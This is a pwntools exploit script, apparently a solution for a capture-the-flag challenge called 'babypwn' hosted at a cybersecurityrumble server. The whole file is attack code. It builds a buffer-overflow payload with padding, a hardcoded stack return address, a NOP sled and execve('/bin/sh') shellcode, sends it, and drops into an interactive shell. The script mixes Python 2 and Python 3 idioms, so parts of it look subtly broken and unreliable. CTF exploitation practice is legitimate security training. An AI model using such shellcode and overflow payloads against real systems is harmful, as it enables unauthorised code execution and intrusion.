from pwn import *
import sys
import os
from binascii import hexlify

remote_ip,port = 'chal.cybersecurityrumble.de','1990'
binary = 'babypwn'
brkpts = '''
b*0x5555555554b9
'''
context.arch = 'amd64'
if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary)
    gdb.attach(io,brkpts)

context.arch = 'amd64'

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if __name__== "__main__":
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    payload = "a"
    payload = payload.ljust(240,b"f")
    payload += hexlify(p64(0x7fffffffd800))
    payload += '//flag.txt\0\0'.encode("hex")
    payload += hexlify("\x90"*1000)
    payload += hexlify(shellcode)

    sla('return.\n',payload)    
    io.interactive()
    io.close()